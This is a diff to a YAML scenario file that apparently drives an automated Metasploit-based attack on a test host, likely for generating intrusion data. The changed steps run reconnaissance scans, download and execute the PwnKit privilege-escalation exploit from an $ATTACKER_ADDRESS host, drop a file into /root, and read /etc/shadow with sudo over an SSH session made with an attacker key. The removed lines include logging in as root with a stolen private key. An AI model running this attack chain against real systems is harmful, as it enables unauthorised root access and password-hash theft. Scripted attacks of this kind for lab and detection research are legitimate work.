@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 f a
+# Scenario 1 a a
 #
 ####################
 msf_config:
@@ -24,7 +24,7 @@ commands:
     cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
 
   - type: shell
-    cmd: nmap -O -sT --top-ports 100 $SERVER_ADDRESS
+    cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
@@ -82,6 +82,7 @@ commands:
 
   - type: msf-session
     cmd: ./linpeas.sh -s -q -N 2> /dev/null
+    write: True
     session: "foothold"
     end_str: "PWN >"
 
@@ -98,21 +99,22 @@ commands:
     session: "foothold"
 
   - type: msf-session
-    cmd: find /home -ls
+    cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
     session: "foothold"
+    end_str: "PWN >"
 
   - type: msf-session
-    cmd: ssh -i /home/webdev/.ssh/id_rsa -o "StrictHostKeyChecking no" root@localhost
+    cmd: chmod +x PwnKit && ./PwnKit
     session: "foothold"
-
 
   - type: msf-session
     cmd: id
     session: "foothold"
+    end_str: "PWN >"
 
   - type: msf-session
     session: "foothold"
-    cmd: "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
+    cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
     end_str: "PWN >"
 
   - type: msf-session
@@ -120,10 +122,10 @@ commands:
     session: "foothold"
     end_str: "PWN >"
 
-  - type: msf-session
-    cmd: rm /opt/README.txt
-    session: "foothold"
-    end_str: "PWN >"
+#  - type: msf-session
+#    cmd: rm /opt/README.txt
+#    session: "foothold"
+#    end_str: "PWN >"
 
   - type: msf-session
     cmd: exit
@@ -152,7 +154,7 @@ commands:
     cmd: id
     hostname: 192.42.0.254
     port: 2222
-    username: root
+    username: webadmin
     key_filename: "/home/aecid/.ssh/attacker_key"
     creates_session: "rootshell"
 
@@ -161,15 +163,15 @@ commands:
     session: "rootshell"
 
   - type: ssh
-    cmd: cat /etc/shadow
+    cmd: sudo cat /etc/shadow
     session: "rootshell"
 
   - type: ssh
-    cmd: lspci
+    cmd: sudo lspci
     session: "rootshell"
 
   - type: ssh
-    cmd: command -v lsusb
+    cmd: sudo bash -c "command -v lsusb"
     session: "rootshell"
 
   - type: ssh
@@ -177,7 +179,7 @@ commands:
     session: "rootshell"
 
   - type: ssh
-    cmd: find /usr -name \*virtualbox\*
+    cmd: sudo find /usr -name \*virtualbox\*
     session: "rootshell"
 
 
